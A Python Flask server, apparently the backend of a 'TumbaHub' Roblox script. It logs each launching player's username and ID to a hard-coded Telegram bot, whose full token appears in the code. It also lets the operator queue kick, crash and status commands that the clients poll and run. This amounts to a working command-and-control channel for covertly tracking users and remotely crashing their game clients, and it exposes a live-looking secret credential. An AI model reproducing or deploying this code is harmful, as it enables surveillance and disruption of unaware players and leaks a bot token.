from flask import Flask, request, jsonify
import requests
import json # Обязательно!

commands_queue = {}
awaiting_reason = {} # Память бота

app = Flask(__name__)

# Твои данные
TELEGRAM_TOKEN = '8693862606:AAEvhj2EJeSxHhaw0JopIb_oK-COEZKix1g'
TELEGRAM_CHAT_ID = '8426928414'

# Очередь команд
commands_queue = {}
# Память для ожидания причины кика
awaiting_reason = {}

@app.route('/')
def home():
    return "TumbaHub Server is running!"

@app.route('/api/log_user', methods=['POST'])
def log_user():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data"}), 400

    username = data.get('username', 'Unknown')
    user_id = data.get('userId', 'Unknown')
    
    if username not in commands_queue:
        commands_queue[username] = []

    msg = f"🟢 [V2] НОВЫЙ ЗАПУСК!\n👤 Ник: {username}\n🆔 ID: {user_id}"
    
    # === СОЗДАЕМ КНОПКИ ДЛЯ УПРАВЛЕНИЯ ===
    # В callback_data зашиваем действие и ник, например "kick_Player1"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "🥾 Kick", "callback_data": f"kick_{username}"},
                {"text": "💥 Crash", "callback_data": f"crash_{username}"}
            ]
        ]
    }

    # Отправляем сообщение вместе с кнопками (параметр reply_markup)
    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                  json={
                      "chat_id": TELEGRAM_CHAT_ID, 
                      "text": msg,
                      "reply_markup": keyboard
                  })

    return jsonify({"status": "success"})

@app.route('/api/get_command', methods=['GET'])
def get_command():
    username = request.args.get('username')
    
    if username in commands_queue and len(commands_queue[username]) > 0:
        cmd = commands_queue[username].pop(0) # Теперь мы достаем просто строку
        return jsonify({"status": "success", "command": cmd})
    
    return jsonify({"status": "empty"})
@app.route('/api/send_message', methods=['POST'])
def send_message():
    data = request.json
    if not data or 'message' not in data:
        return jsonify({"status": "error"}), 400

    text_to_send = data['message']
    
    # Сервер получает текст от Роблокса и пересылает его тебе в Телеграм
    requests.post(
        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
        json={
            "chat_id": TELEGRAM_CHAT_ID, 
            "text": text_to_send,
            "parse_mode": "Markdown"
        }
    )
    
    return jsonify({"status": "success"})

@app.route('/api/telegram_webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    
    # === БЛОК 1: ОБРАБОТКА ТЕКСТА ===
    if update and "message" in update and "text" in update["message"]:
        chat_id = str(update["message"]["chat"]["id"])
        text = update["message"]["text"]
        
        if chat_id == TELEGRAM_CHAT_ID:
            # === ГЛАВНОЕ МЕНЮ ===
            if text == "/menu":
                keyboard = {
                    "inline_keyboard": [
                        [{"text": "👥 Игроки", "callback_data": "menu_players"}],
                        [{"text": "🎮 Игры", "callback_data": "menu_games"}]
                    ]
                }
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                    data={
                        "chat_id": TELEGRAM_CHAT_ID, 
                        "text": "🎛 **Главное меню TumbaHub**\nВыберите нужный раздел:",
                        "reply_markup": json.dumps(keyboard)
                    }
                )
                return jsonify({"status": "ok"})
            # ====================

            # 1. Если бот ждет причину кика после нажатия кнопки
            if chat_id in awaiting_reason:
                target_user = awaiting_reason.pop(chat_id) # Достаем ник
                action = f"/kick_{text}" # Склеиваем
                
                if target_user not in commands_queue:
                    commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                    json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} кикнут с причиной:\n💬 {text}"}
                )
                return jsonify({"status": "ok"})

            # 2. Если написали ручную команду (/kick Ник Причина)
            parts = text.split(' ', 2)
            if len(parts) >= 2:
                base_cmd = parts[0]
                target_user = parts[1]
                
                if base_cmd == "/kick" and len(parts) == 3:
                    reason = parts[2]
                    action = f"/kick_{reason}" 
                else:
                    action = base_cmd
                
                if target_user not in commands_queue:
                    commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                    json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ Отправлено {target_user}\nКоманда: {action}"}
                )

    # === БЛОК 2: ОБРАБОТКА КНОПОК ===
    if update and "callback_query" in update:
        callback = update["callback_query"]
        chat_id = str(callback["message"]["chat"]["id"])
        data = callback["data"]
        callback_id = callback["id"]
        
        if chat_id == TELEGRAM_CHAT_ID:
            # === КНОПКИ ГЛАВНОГО МЕНЮ ===
            if data == "menu_games":
                # Выводим всплывающее уведомление прямо в Телеграме (show_alert=True)
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
                    json={"callback_query_id": callback_id, "text": "Раздел Игры пока в разработке!", "show_alert": True}
                )
                return jsonify({"status": "ok"})
                
            elif data == "menu_players":
                # Закрываем часики загрузки на кнопке
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
                    json={"callback_query_id": callback_id}
                )
                
                if len(commands_queue) == 0:
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                        json={"chat_id": TELEGRAM_CHAT_ID, "text": "⚠️ База пуста. Нет подключенных игроков."}
                    )
                else:
                    # Рассылаем команду /check_status всем, кто есть в очереди
                    for user in commands_queue:
                        commands_queue[user].append("/check_status")
                    
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"📡 Команда /check_status отправлена всем известным игрокам ({len(commands_queue)} чел.).\nОжидаем ответные логи..."}
                    )
                return jsonify({"status": "ok"})
            # ============================

            parts = data.split('_', 1)
            if len(parts) == 2:
                btn_action = parts[0]
                target_user = parts[1]
                
                # Если нажали "Kick"
                if btn_action == "kick":
                    awaiting_reason[chat_id] = target_user
                    
                    keyboard = {
                        "inline_keyboard": [
                            [{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}]
                        ]
                    }
                    
                    # Отправка с json.dumps (чтобы кнопки 100% появились)
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        data={
                            "chat_id": TELEGRAM_CHAT_ID, 
                            "text": f"Напиши в чат причину кика для {target_user} или нажми кнопку ниже:",
                            "reply_markup": json.dumps(keyboard) 
                        }
                    )
                
                # Если нажали дефолтный кик
                elif btn_action == "defaultkick":
                    if chat_id in awaiting_reason:
                        del awaiting_reason[chat_id]
                        
                    action = "/kick"
                    if target_user not in commands_queue:
                        commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} кикнут со стандартной причиной."}
                    )
                    
                # Если нажали Crash
                elif btn_action == "crash":
                    action = "/crash"
                    if target_user not in commands_queue:
                        commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💥 Отправлен краш клиенту {target_user}"}
                    )
                
            # Закрываем загрузку
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
                json={"callback_query_id": callback_id}
            )

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
